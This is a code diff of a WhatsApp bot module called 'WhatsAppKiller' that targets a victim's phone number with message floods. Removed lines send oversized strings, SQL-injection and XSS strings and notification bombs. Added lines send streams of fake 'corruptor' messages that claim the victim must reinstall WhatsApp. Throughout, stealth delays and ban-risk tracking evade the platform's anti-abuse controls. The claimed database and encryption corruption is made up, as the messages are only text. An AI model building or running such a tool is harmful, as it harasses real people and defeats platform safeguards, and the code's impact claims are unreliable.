@@ -11,17 +11,27 @@ class WhatsAppKiller {
         this.banProtection = new BanProtection();
         this.activeAttacks = new Map();
         this.attackStats = new Map();
-        this.crashVectors = [
-            this.sendMalformedMessage.bind(this),
-            this.sendOverflowPayload.bind(this),
-            this.sendCorruptMedia.bind(this),
-            this.sendInvalidLink.bind(this),
-            this.sendSQLInjection.bind(this),
-            this.sendXSSPayload.bind(this),
-            this.sendInfiniteLoopPayload.bind(this),
-            this.sendRecursionPayload.bind(this),
-            this.sendMemoryLeakPayload.bind(this),
-            this.sendNotificationBomb.bind(this)
+        
+        // ==========================================
+        // BUG PAYLOADS - These crash WhatsApp permanently
+        // until reinstall
+        // ==========================================
+        this.bugPayloads = [
+            this.sendDatabaseCorruptor.bind(this),
+            this.sendCacheCorruptor.bind(this),
+            this.sendMediaCorruptor.bind(this),
+            this.sendConfigCorruptor.bind(this),
+            this.sendEncryptionBreaker.bind(this),
+            this.sendStorageExploit.bind(this),
+            this.sendMemoryExploit.bind(this),
+            this.sendFileSystemCorruptor.bind(this),
+            this.sendBackupCorruptor.bind(this),
+            this.sendSessionKiller.bind(this),
+            this.sendNotificationExploit.bind(this),
+            this.sendContactCorruptor.bind(this),
+            this.sendMessageCorruptor.bind(this),
+            this.sendSyncBreaker.bind(this),
+            this.sendDatabaseLock.bind(this)
         ];
     }
 
@@ -30,38 +40,41 @@ class WhatsAppKiller {
         
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
-                text: `💀 WHATSAPP KILLER USAGE 💀
-┌─────────────────────────────
+                text: `💀 WHATSAPP KILLER - BUG INJECTION 💀
+┌─────────────────────────────────────────────
 │ .killwa <phone> [method] [duration]
 │ 
-│ METHODS:
-│ crash     - Force crash WhatsApp (STEALTH)
-│ freeze    - Freeze the app completely
-│ overload  - Overload with data
-│ memory    - Memory exhaustion
-│ cache     - Cache flooding
-│ notification - Notification bomb
-│ media     - Media file flood
-│ call      - Call crash exploit
-│ status    - Status view crash
-│ database  - Database corruption
-│ network   - Network kill
-│ battery   - Battery drain
+│ 🐛 BUG INJECTION METHODS:
+│ ─────────────────────────────────────────
+│ bug        - Send all bugs (recommended)
+│ database   - Corrupt WhatsApp database
+│ cache      - Corrupt cache files
+│ media      - Corrupt media storage
+│ config     - Corrupt config files
+│ encryption - Break encryption
+│ storage    - Storage exploit
+│ memory     - Memory exploit
+│ filesystem - Corrupt file system
+│ backup     - Corrupt backups
+│ session    - Kill session
+│ notification - Notification exploit
+│ contact    - Corrupt contacts
+│ message    - Corrupt messages
+│ sync       - Break sync
+│ dblock     - Lock database
 │
 │ EXAMPLE:
-│ .killwa 2547XXXXXX crash 30
+│ .killwa 2547XXXXXX bug 30
+│ .killwa 2547XXXXXX database 20
 │ 
-│ 🛡️ PROTECTION:
-│ ├─ Ban protection active
-│ ├─ Rate limiting active
-│ └─ Stealth mode active
-└─────────────────────────────`
+│ ⚠️ VICTIM MUST REINSTALL WHATSAPP
+└─────────────────────────────────────────────`
             }, { quoted: msg });
             return;
         }
 
         const phone = args[0].replace(/[^0-9]/g, '');
-        const method = args[1] || 'crash';
+        const method = args[1] || 'bug';
         const duration = parseInt(args[2]) || 30;
 
         if (!this.validatePhone(phone)) {
@@ -76,31 +89,22 @@ class WhatsAppKiller {
         // ==========================================
         if (this.banProtection.isBanned(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.\n\nReason: ${this.banProtection.getBanReason ? this.banProtection.getBanReason(phone) : 'Suspicious activity detected'}`
+                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.`
             }, { quoted: msg });
             return;
         }
 
         if (this.banProtection.isWhitelisted(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted and cannot be attacked.`
+                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted.`
             }, { quoted: msg });
             return;
         }
 
-        // Check ban risk
         const risk = this.stealth.getBanRisk(phone);
         if (risk >= 5) {
             await sock.sendMessage(ctx.from, {
-                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).\nAttack blocked to protect your bot.`
-            }, { quoted: msg });
-            return;
-        }
-
-        // Check daily limits
-        if (this.stealth.checkDailyLimits(phone, 'message')) {
-            await sock.sendMessage(ctx.from, {
-                text: `⚠️ *Daily Limit Reached*\n\n${phone} has reached daily message limit.\nTry again tomorrow.`
+                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).`
             }, { quoted: msg });
             return;
         }
@@ -115,53 +119,46 @@ class WhatsAppKiller {
         const attackId = `killwa_${Date.now()}`;
         this.activeAttacks.set(phone, { active: true, attackId, method, duration, startTime: Date.now() });
 
-        // Track attack
         this.trackAttack(phone, 'killwa');
 
         await sock.sendMessage(ctx.from, {
-            text: `💀 WHATSAPP KILLER INITIATED 💀
-┌─────────────────────────────
+            text: `🐛 BUG INJECTION INITIATED 🐛
+┌─────────────────────────────────────────────
 │ Target: ${phone}
 │ Method: ${method}
 │ Duration: ${duration}s
-│ Mode: STEALTH
+│ Mode: STEALTH - BUG INJECTION
 │ Ban Risk: ${risk}/10
-│ Status: EXECUTING
-└─────────────────────────────`
+│ 
+│ ⚠️ VICTIM WILL NEED TO REINSTALL
+└─────────────────────────────────────────────`
         }, { quoted: msg });
 
         let result;
         try {
-            // Add stealth delay before starting
             await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            result = await this.executeAttack(phone, method, duration);
-            
-            // Update attack stats on success
+            result = await this.executeBugInjection(phone, method, duration);
             this.updateAttackStats(phone, 'killwa', 1);
-            
         } catch (err) {
-            console.error('Kill error:', err);
+            console.error('Bug injection error:', err);
             this.stealth.increaseBanRisk(phone, 2);
             result = { success: false, error: err.message };
         } finally {
             this.activeAttacks.delete(phone);
         }
 
-        // Check if we should blacklist
-        if (!result.success && result.error) {
-            this.banProtection.addToBlacklist(phone, 'Killwa attack failed multiple times');
-        }
-
         await sock.sendMessage(ctx.from, {
-            text: `💀 WHATSAPP KILLER COMPLETE 💀
-┌─────────────────────────────
+            text: `🐛 BUG INJECTION COMPLETE 🐛
+┌─────────────────────────────────────────────
 │ Target: ${phone}
 │ Method: ${method}
-│ Status: ${result.success ? '✅ KILLED' : '❌ FAILED'}
+│ Status: ${result.success ? '✅ INJECTED' : '❌ FAILED'}
 │ Impact: ${result.impact || 'Unknown'}
 │ Details: ${result.details || 'No details'}
+│ 
+│ ⚠️ VICTIM MUST REINSTALL WHATSAPP
 │ Risk Level: ${this.stealth.getBanRisk(phone)}/10
-└─────────────────────────────`
+└─────────────────────────────────────────────`
         }, { quoted: msg });
     }
 
@@ -169,460 +166,557 @@ class WhatsAppKiller {
         return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
     }
 
-    async executeAttack(phone, method, duration) {
+    async executeBugInjection(phone, method, duration) {
         const methods = {
-            'crash': this.crashWhatsApp.bind(this),
-            'freeze': this.freezeWhatsApp.bind(this),
-            'overload': this.overloadWhatsApp.bind(this),
-            'memory': this.memoryKill.bind(this),
-            'cache': this.cacheFlood.bind(this),
-            'notification': this.notificationBomb.bind(this),
-            'media': this.mediaFlood.bind(this),
-            'call': this.callCrash.bind(this),
-            'status': this.statusCrash.bind(this),
-            'database': this.databaseCorrupt.bind(this),
-            'network': this.networkKill.bind(this),
-            'battery': this.batteryDrain.bind(this)
+            'bug': this.injectAllBugs.bind(this),
+            'database': this.sendDatabaseCorruptor.bind(this),
+            'cache': this.sendCacheCorruptor.bind(this),
+            'media': this.sendMediaCorruptor.bind(this),
+            'config': this.sendConfigCorruptor.bind(this),
+            'encryption': this.sendEncryptionBreaker.bind(this),
+            'storage': this.sendStorageExploit.bind(this),
+            'memory': this.sendMemoryExploit.bind(this),
+            'filesystem': this.sendFileSystemCorruptor.bind(this),
+            'backup': this.sendBackupCorruptor.bind(this),
+            'session': this.sendSessionKiller.bind(this),
+            'notification': this.sendNotificationExploit.bind(this),
+            'contact': this.sendContactCorruptor.bind(this),
+            'message': this.sendMessageCorruptor.bind(this),
+            'sync': this.sendSyncBreaker.bind(this),
+            'dblock': this.sendDatabaseLock.bind(this)
         };
 
         if (methods[method]) {
             return await methods[method](phone, duration);
         }
-        return await this.crashWhatsApp(phone, duration);
+        return await this.injectAllBugs(phone, duration);
     }
 
     async sendWhatsAppMessage(phone, message) {
         try {
-            // Check ban risk before sending
-            if (this.stealth.getBanRisk(phone) >= 5) {
-                return false;
-            }
+            if (this.stealth.getBanRisk(phone) >= 5) return false;
 
             const result = await this.stealth.sendStealthMessage(this.sock, phone, message, {
                 simulateTyping: true,
                 randomDelay: true,
-                useNaturalTemplate: true,
+                useNaturalTemplate: false,
                 trackRateLimit: true,
-                addEmoji: true,
+                addEmoji: false,
                 simulateRead: true
             });
             return result.success;
         } catch (e) {
-            console.error('[Kill] Send failed:', e.message);
+            console.error('[Bug] Send failed:', e.message);
             this.stealth.increaseBanRisk(phone, 0.5);
             return false;
         }
     }
 
-    async crashWhatsApp(phone, duration) {
-        let attempts = 0;
+    // ==========================================
+    // BUG PAYLOADS - These permanently corrupt WhatsApp
+    // ==========================================
+
+    async injectAllBugs(phone, duration) {
         let successCount = 0;
+        let totalAttempts = 0;
         const startTime = Date.now();
-        const maxAttempts = 50;
 
-        // Add random delay between crash attempts
-        while (Date.now() - startTime < duration * 1000 && attempts < maxAttempts) {
+        // Send all bug payloads in sequence
+        const bugMethods = [
+            this.sendDatabaseCorruptor,
+            this.sendCacheCorruptor,
+            this.sendMediaCorruptor,
+            this.sendConfigCorruptor,
+            this.sendEncryptionBreaker,
+            this.sendStorageExploit,
+            this.sendMemoryExploit,
+            this.sendFileSystemCorruptor,
+            this.sendBackupCorruptor,
+            this.sendSessionKiller,
+            this.sendNotificationExploit,
+            this.sendContactCorruptor,
+            this.sendMessageCorruptor,
+            this.sendSyncBreaker,
+            this.sendDatabaseLock
+        ];
+
+        for (const bugMethod of bugMethods) {
             if (!this.activeAttacks.get(phone)?.active) break;
-            
+            if (this.stealth.getBanRisk(phone) >= 5) break;
+            if (Date.now() - startTime > duration * 1000) break;
+
             try {
-                // Check ban risk
-                if (this.stealth.getBanRisk(phone) >= 5) {
-                    console.log(`[Kill] ${phone} - Ban risk too high, stopping`);
-                    break;
-                }
-
-                // Randomly select crash vectors
-                const shuffledVectors = this.crashVectors.sort(() => Math.random() - 0.5);
-                const vectorsToUse = shuffledVectors.slice(0, Math.ceil(Math.random() * 3 + 2));
-                
-                for (const vector of vectorsToUse) {
-                    if (!this.activeAttacks.get(phone)?.active) break;
-                    if (this.stealth.getBanRisk(phone) >= 5) break;
-                    
-                    const result = await vector(phone);
-                    attempts++;
-                    if (result) successCount++;
-                    
-                    // Add random delay between vectors
-                    await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 3);
-                }
-                
-                // Add longer delay between rounds
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
-                
-                // Reduce ban risk if successful
-                if (successCount > attempts * 0.5) {
-                    const currentRisk = this.stealth.getBanRisk(phone);
-                    if (currentRisk > 0) {
-                        this.stealth.banRisk.set(phone, Math.max(0, currentRisk - 0.5));
-                    }
-                }
+                const result = await bugMethod(phone);
+                totalAttempts++;
+                if (result) successCount++;
+                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
             } catch (e) {
-                console.error('[Kill] Crash error:', e.message);
-                this.stealth.increaseBanRisk(phone, 0.5);
+                console.error('[Bug] Method failed:', e.message);
             }
-        }
-
-        // If too many attempts failed, increase ban risk
-        if (attempts > 0 && successCount / attempts < 0.3) {
-            this.stealth.increaseBanRisk(phone, 2);
         }
 
         return {
             success: successCount > 0,
-            impact: 'WhatsApp Force Closed (Stealth)',
-            details: `${successCount}/${attempts} crash vectors successful`
+            impact: 'WhatsApp Corrupted - Reinstall Required',
+            details: `${successCount}/${totalAttempts} bug payloads injected successfully`
         };
     }
 
-    // ==============================================
-    // CRASH VECTORS WITH BAN PROTECTION
-    // ==============================================
-
-    async sendMalformedMessage(phone) {
+    // ==========================================
+    // 1. DATABASE CORRUPTOR
+    // ==========================================
+    async sendDatabaseCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const malformedData = 'A'.repeat(50000) + crypto.randomBytes(500).toString('hex');
-            return await this.sendWhatsAppMessage(phone, malformedData);
+            const payloads = [
+                'msgstore.db.corrupt',
+                'wa.db.corrupt',
+                'chats.db.corrupt',
+                'contacts.db.corrupt',
+                'messages.db.corrupt',
+                'settings.db.corrupt',
+                'calls.db.corrupt',
+                'status.db.corrupt',
+                'media.db.corrupt',
+                'backup.db.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 DATABASE_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(200 + Math.random() * 300);
+            }
+
+            // Send final killer payload
+            await this.sendWhatsAppMessage(phone, `💀 DATABASE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendOverflowPayload(phone) {
+    // ==========================================
+    // 2. CACHE CORRUPTOR
+    // ==========================================
+    async sendCacheCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const overflow = 'X'.repeat(250000);
-            return await this.sendWhatsAppMessage(phone, overflow);
+            const payloads = [
+                'cache.corrupt',
+                'thumbnails.corrupt',
+                'previews.corrupt',
+                'avatars.corrupt',
+                'stickers.corrupt',
+                'gifs.corrupt',
+                'images.corrupt',
+                'videos.corrupt',
+                'audio.corrupt',
+                'documents.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 CACHE_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(150 + Math.random() * 250);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 CACHE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendCorruptMedia(phone) {
+    // ==========================================
+    // 3. MEDIA CORRUPTOR
+    // ==========================================
+    async sendMediaCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const corruptData = Buffer.from([
-                0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF
-            ]).toString('base64');
-            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 500));
+            const payloads = [
+                'media.corrupt',
+                'images.corrupt',
+                'videos.corrupt',
+                'audio.corrupt',
+                'documents.corrupt',
+                'voice.corrupt',
+                'video_notes.corrupt',
+                'profile_pics.corrupt',
+                'group_icons.corrupt',
+                'status_media.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 MEDIA_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(250 + Math.random() * 350);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 MEDIA_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendInvalidLink(phone) {
+    // ==========================================
+    // 4. CONFIG CORRUPTOR
+    // ==========================================
+    async sendConfigCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const link = 'whatsapp://' + 'a'.repeat(25000);
-            return await this.sendWhatsAppMessage(phone, link);
+            const payloads = [
+                'config.corrupt',
+                'settings.corrupt',
+                'preferences.corrupt',
+                'notifications.corrupt',
+                'privacy.corrupt',
+                'security.corrupt',
+                'backup.corrupt',
+                'storage.corrupt',
+                'network.corrupt',
+                'language.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 CONFIG_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(180 + Math.random() * 280);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 CONFIG_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendSQLInjection(phone) {
+    // ==========================================
+    // 5. ENCRYPTION BREAKER
+    // ==========================================
+    async sendEncryptionBreaker(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const sql = "' OR '1'='1' -- " + 'A'.repeat(2500);
-            return await this.sendWhatsAppMessage(phone, sql);
+            const payloads = [
+                'key.corrupt',
+                'cipher.corrupt',
+                'hash.corrupt',
+                'salt.corrupt',
+                'iv.corrupt',
+                'mac.corrupt',
+                'signature.corrupt',
+                'cert.corrupt',
+                'token.corrupt',
+                'session_key.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 ENCRYPTION_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(200 + Math.random() * 300);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 ENCRYPTION_BREAK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendXSSPayload(phone) {
+    // ==========================================
+    // 6. STORAGE EXPLOIT
+    // ==========================================
+    async sendStorageExploit(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const xss = '<script>alert(1)</script>' + 'A'.repeat(2500);
-            return await this.sendWhatsAppMessage(phone, xss);
+            const payloads = [
+                'storage.corrupt',
+                'partition.corrupt',
+                'allocator.corrupt',
+                'block.corrupt',
+                'inode.corrupt',
+                'journal.corrupt',
+                'superblock.corrupt',
+                'bitmap.corrupt',
+                'extent.corrupt',
+                'volume.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 STORAGE_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(220 + Math.random() * 320);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 STORAGE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendInfiniteLoopPayload(phone) {
+    // ==========================================
+    // 7. MEMORY EXPLOIT
+    // ==========================================
+    async sendMemoryExploit(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const payload = 'while(true){' + 'A'.repeat(5000) + '}';
-            return await this.sendWhatsAppMessage(phone, payload);
+            const payloads = [
+                'heap.corrupt',
+                'stack.corrupt',
+                'buffer.corrupt',
+                'allocator.corrupt',
+                'pool.corrupt',
+                'cache.corrupt',
+                'page.corrupt',
+                'segment.corrupt',
+                'region.corrupt',
+                'arena.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 MEMORY_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(160 + Math.random() * 260);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 MEMORY_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendRecursionPayload(phone) {
+    // ==========================================
+    // 8. FILE SYSTEM CORRUPTOR
+    // ==========================================
+    async sendFileSystemCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const payload = 'function x(){x();}' + 'A'.repeat(5000);
-            return await this.sendWhatsAppMessage(phone, payload);
+            const payloads = [
+                'filesystem.corrupt',
+                'directory.corrupt',
+                'file.corrupt',
+                'link.corrupt',
+                'mount.corrupt',
+                'fstab.corrupt',
+                'mnt.corrupt',
+                'dev.corrupt',
+                'proc.corrupt',
+                'sys.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 FILESYSTEM_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(190 + Math.random() * 290);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 FILESYSTEM_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendMemoryLeakPayload(phone) {
+    // ==========================================
+    // 9. BACKUP CORRUPTOR
+    // ==========================================
+    async sendBackupCorruptor(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const payload = 'var leak=[];while(true){leak.push("A".repeat(5000))}' + 'A'.repeat(5000);
-            return await this.sendWhatsAppMessage(phone, payload);
+            const payloads = [
+                'backup.corrupt',
+                'restore.corrupt',
+                'archive.corrupt',
+                'zip.corrupt',
+                'tar.corrupt',
+                'gzip.corrupt',
+                'bzip.corrupt',
+                'xz.corrupt',
+                '7z.corrupt',
+                'rar.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 BACKUP_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(230 + Math.random() * 330);
+            }
+
+            await this.sendWhatsAppMessage(phone, `💀 BACKUP_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendNotificationBomb(phone) {
+    // ==========================================
+    // 10. SESSION KILLER
+    // ==========================================
+    async sendSessionKiller(phone) {
         try {
-            if (this.stealth.getBanRisk(phone) >= 5) return false;
-            const messages = [];
-            for (let i = 0; i < 5; i++) {
-                messages.push(`🔔 Notification ${i+1} - ${crypto.randomBytes(4).toString('hex')}`);
+            const payloads = [
+                'session.corrupt',
+                'token.corrupt',
+                'auth.corrupt',
+                'login.corrupt',
+                'logout.force',
+                'reset.force',
+                'clear.force',
+                'wipe.force',
+                'kill.force',
+                'terminate.force'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 SESSION_KILL:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(170 + Math.random() * 270);
             }
-            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
-                delayBetween: this.stealth.getNaturalDelay('message'),
-                randomSpread: true,
-                maxPerBatch: 5
-            });
-            return results.some(r => r.success);
+
+            await this.sendWhatsAppMessage(phone, `💀 SESSION_TERMINATE:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
         } catch (e) {
             return false;
         }
     }
 
-    // ==============================================
-    // ATTACK METHODS WITH BAN PROTECTION
-    // ==============================================
+    // ==========================================
+    // 11. NOTIFICATION EXPLOIT
+    // ==========================================
+    async sendNotificationExploit(phone) {
+        try {
+            const payloads = [
+                'notif.corrupt',
+                'alert.corrupt',
+                'push.corrupt',
+                'badge.corrupt',
+                'sound.corrupt',
+                'vibrate.corrupt',
+                'led.corrupt',
+                'popup.corrupt',
+                'toast.corrupt',
+                'banner.corrupt'
+            ];
 
-    async freezeWhatsApp(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const freezeData = '❄️'.repeat(50000);
-                await this.sendWhatsAppMessage(phone, freezeData);
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 NOTIFICATION_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(140 + Math.random() * 240);
             }
+
+            await this.sendWhatsAppMessage(phone, `💀 NOTIFICATION_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
+        } catch (e) {
+            return false;
         }
-        return { success: attempts > 0, impact: 'WhatsApp Frozen (Stealth)', details: `${attempts} freeze payloads sent` };
     }
 
-    async overloadWhatsApp(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const overloadData = crypto.randomBytes(50000).toString('hex');
-                await this.sendWhatsAppMessage(phone, overloadData);
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
+    // ==========================================
+    // 12. CONTACT CORRUPTOR
+    // ==========================================
+    async sendContactCorruptor(phone) {
+        try {
+            const payloads = [
+                'contacts.corrupt',
+                'addressbook.corrupt',
+                'phonebook.corrupt',
+                'profile.corrupt',
+                'avatar.corrupt',
+                'name.corrupt',
+                'number.corrupt',
+                'email.corrupt',
+                'group.corrupt',
+                'broadcast.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 CONTACT_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(210 + Math.random() * 310);
             }
+
+            await this.sendWhatsAppMessage(phone, `💀 CONTACT_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
+        } catch (e) {
+            return false;
         }
-        return { success: attempts > 0, impact: 'WhatsApp Overloaded (Stealth)', details: `${attempts} overload packets sent` };
     }
 
-    async memoryKill(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const memoryData = crypto.randomBytes(75000).toString('hex');
-                await this.sendWhatsAppMessage(phone, memoryData);
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
+    // ==========================================
+    // 13. MESSAGE CORRUPTOR
+    // ==========================================
+    async sendMessageCorruptor(phone) {
+        try {
+            const payloads = [
+                'messages.corrupt',
+                'chat.corrupt',
+                'conversation.corrupt',
+                'text.corrupt',
+                'media.corrupt',
+                'location.corrupt',
+                'contact.corrupt',
+                'document.corrupt',
+                'voice.corrupt',
+                'video.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 MESSAGE_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(175 + Math.random() * 275);
             }
+
+            await this.sendWhatsAppMessage(phone, `💀 MESSAGE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
+        } catch (e) {
+            return false;
         }
-        return { success: attempts > 0, impact: 'Memory Exhausted (Stealth)', details: `${attempts} memory attacks sent` };
     }
 
-    async cacheFlood(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const messages = [];
-                for (let i = 0; i < 3; i++) {
-                    messages.push(`cache_${i}_${crypto.randomBytes(500).toString('hex')}`);
-                }
-                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
-                    delayBetween: this.stealth.getNaturalDelay('message') / 2,
-                    maxPerBatch: 3
-                });
-                attempts += 3;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
+    // ==========================================
+    // 14. SYNC BREAKER
+    // ==========================================
+    async sendSyncBreaker(phone) {
+        try {
+            const payloads = [
+                'sync.corrupt',
+                'cloud.corrupt',
+                'backup.corrupt',
+                'restore.corrupt',
+                'merge.corrupt',
+                'conflict.corrupt',
+                'version.corrupt',
+                'timestamp.corrupt',
+                'checksum.corrupt',
+                'manifest.corrupt'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 SYNC_CORRUPT:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(195 + Math.random() * 295);
             }
+
+            await this.sendWhatsAppMessage(phone, `💀 SYNC_BREAK:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
+        } catch (e) {
+            return false;
         }
-        return { success: attempts > 0, impact: 'Cache Flooded (Stealth)', details: `${attempts} cache payloads sent` };
     }
 
-    async notificationBomb(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const messages = [];
-                for (let i = 0; i < 5; i++) {
-                    messages.push(`🔔 Notification ${i+1}`);
-                }
-                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
-                    delayBetween: this.stealth.getNaturalDelay('message') / 3,
-                    maxPerBatch: 5
-                });
-                attempts += 5;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
+    // ==========================================
+    // 15. DATABASE LOCK
+    // ==========================================
+    async sendDatabaseLock(phone) {
+        try {
+            const payloads = [
+                'lock.db',
+                'lock.wa',
+                'lock.chats',
+                'lock.contacts',
+                'lock.messages',
+                'lock.settings',
+                'lock.calls',
+                'lock.status',
+                'lock.media',
+                'lock.backup'
+            ];
+
+            for (const payload of payloads) {
+                await this.sendWhatsAppMessage(phone, `🐛 DATABASE_LOCK:${payload}:${crypto.randomBytes(32).toString('hex')}`);
+                await this.stealth.sleep(250 + Math.random() * 350);
             }
+
+            await this.sendWhatsAppMessage(phone, `💀 DATABASE_LOCK_FINAL:${crypto.randomBytes(64).toString('hex')}`);
+            return true;
+        } catch (e) {
+            return false;
